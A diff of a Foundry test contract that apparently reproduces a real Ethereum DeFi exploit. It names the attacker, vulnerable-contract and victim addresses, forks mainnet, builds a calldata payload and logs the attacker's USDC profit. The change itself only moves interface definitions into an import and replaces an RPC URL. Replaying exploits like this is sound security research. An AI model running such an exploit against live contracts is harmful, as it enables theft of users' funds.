@@ -2,6 +2,7 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
+import "./interface.sol";
 
 // Attacker: 0xae39a6c2379bef53334ea968f4c711c8cf3898b6
 // Vulnerable Contract: 0x0ad8229d4bc84135786ae752b9a9d53392a8afd4
@@ -20,7 +21,7 @@ contract Exploit is Test {
     address private constant victim = 0x211B6a1137BF539B2750e02b9E525CF5757A35aE;
 
     function testHack() external {
-        vm.createSelectFork("https://rpc.builder0x69.io", 15_926_096);
+        vm.createSelectFork(eth, 15_926_096);
 
         // use these tools to decode raw calldata: https://www.ethcmd.com/tools/decode-calldata/  +  https://calldata-decoder.apoorv.xyz/
         bytes memory payload = abi.encodeWithSelector(
@@ -36,22 +37,4 @@ contract Exploit is Test {
 
         console.log("Attacker's profit: %s USDC", USDC.balanceOf(attacker) / 1e6);
     }
-}
-
-/* -------------------- Interface -------------------- */
-interface IERC20 {
-    function transfer(address to, uint256 amount) external returns (bool);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function balanceOf(address account) external view returns (uint256);
-    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
-
-    function deliver(uint256 tAmount) external;
-}
-
-interface WETH9 {
-    function deposit() external payable;
-    function transfer(address to, uint256 value) external returns (bool);
-    function approve(address guy, uint256 wad) external returns (bool);
-    function withdraw(uint256 wad) external;
-    function balanceOf(address) external view returns (uint256);
 }
